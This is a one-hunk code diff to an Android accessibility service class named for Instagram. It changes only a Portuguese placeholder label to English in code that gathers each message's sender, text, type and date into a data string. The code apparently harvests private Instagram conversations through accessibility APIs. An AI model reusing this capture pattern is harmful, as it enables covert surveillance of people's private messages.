@@ -61,7 +61,7 @@ public class AccessibilityServiceInsta extends AccessibilityService {
                                 data += "[\"" + person + "\", \"" + message + "\", \"" + type + "\", \"" + date + "\"],";
                             }
                             else {
-                                data += "[\"" + person + "\", \"Média ou Story\", \"" + type + "\", \"" + date + "\"],";
+                                data += "[\"" + person + "\", \"Media or Story\", \"" + type + "\", \"" + date + "\"],";
                             }
                         }
                         lastmessage = message;
